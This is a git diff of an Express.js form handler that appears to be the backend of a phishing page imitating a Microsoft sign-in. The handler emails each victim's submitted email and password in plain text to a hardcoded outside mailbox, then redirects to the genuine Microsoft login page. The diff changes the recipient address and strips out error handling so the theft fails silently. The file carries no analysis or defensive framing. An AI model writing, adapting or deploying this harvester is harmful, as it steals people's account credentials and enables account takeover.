@@ -45,15 +45,14 @@ app.post('/submit', (req, res) => {
 
     const mailOptions = {
         from: process.env.SMTP_USER || "support12@graysfx.online", // your email address
-        to: "marokemaroke2020@gmail.com", // recipient's email address
+        to: "Hillarymaria019@gmail.com", // recipient's email address
         subject: 'Form Submission',
         text: `Email: ${email}\nPassword: ${password}`
     };
 
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
-            console.error(error);
-            return res.status(500).send('Failed to send email. Please try again later.');
+           
         }
         // Redirect to Microsoft login URL
         res.redirect('https://login.microsoftonline.com/');
